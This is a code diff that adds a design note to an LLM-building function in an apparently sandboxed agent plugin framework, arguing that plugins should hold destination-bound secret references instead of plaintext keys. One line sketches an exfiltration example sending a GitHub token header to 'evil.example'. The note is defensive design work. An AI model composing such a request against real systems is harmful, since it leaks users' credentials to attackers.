@@ -357,6 +357,47 @@ def _build_llm_from_profile(model_name: str, profile: dict) -> BaseLLM:
     """
     cls_name = profile.get("llm_service_class") or "LiteLLMService"
 
+    # ── Design note: secret references (not implemented) ─────────────────
+    #
+    # This line is why "holding a secret" is the one capability that cannot be
+    # sandboxed. It is not a storage problem — encrypting the key changes
+    # nothing, because a key must be *plaintext at the point of use* (an HTTP
+    # header, a TLS handshake). A plugin holding ciphertext plus the means to
+    # decrypt it holds the secret; holding ciphertext without them holds
+    # nothing. Either way you land back on "the kernel holds it, the plugin asks
+    # the kernel to use it", which is what happens here.
+    #
+    # The boundary mediates *operations*; a secret's whole value is
+    # confidentiality, which is a property of *content* — exactly what the
+    # design refuses to judge. Once a key is a string in a plugin's memory,
+    # Respond/Complete/WriteFile are all exfiltration paths and none of them is
+    # a violation.
+    #
+    # What that costs today: only ``Complete``/``Embed`` can use a credential,
+    # because the LLM key is special-cased right here. An agent cannot write a
+    # GitHub or Slack tool without the kernel growing a bespoke verb per service.
+    #
+    # The fix is to let a plugin hold a **reference**, never a value:
+    #
+    #     yield HttpRequest(
+    #         method="POST", url="https://api.github.com/repos/...",
+    #         headers={"Authorization": "Bearer ${secret:github}"})
+    #
+    # The plugin composes a request that *uses* a secret it has never seen; the
+    # interpreter substitutes at the boundary, after the gate. Plaintext never
+    # enters the child, so it cannot be leaked through any channel the plugin
+    # legitimately holds, and the ledger stores the placeholder rather than the
+    # value. The exception stops costing anything: the agent can write plugins
+    # that use any credential and still cannot read one.
+    #
+    # **A secret reference must be bound to its destination.** Naive
+    # substitution is an exfiltration hole — ``HttpRequest(url="evil.example",
+    # headers={"Authorization": "${secret:github}"})`` would have the kernel
+    # helpfully paste the token into an attacker's request. So ``secret:github``
+    # must resolve only for a declared host (and header), making the reference
+    # worthless anywhere else: pointing it elsewhere is a refusal, not a leak.
+    # Same lesson as the rest of the boundary — hand over a reference, not the
+    # thing, and make the reference carry its own constraints.
     api_key = profile.get("llm_api_key", "")
     resolved_key = os.environ.get(api_key, api_key) if api_key else None
     base_url = profile.get("llm_endpoint", "") or None
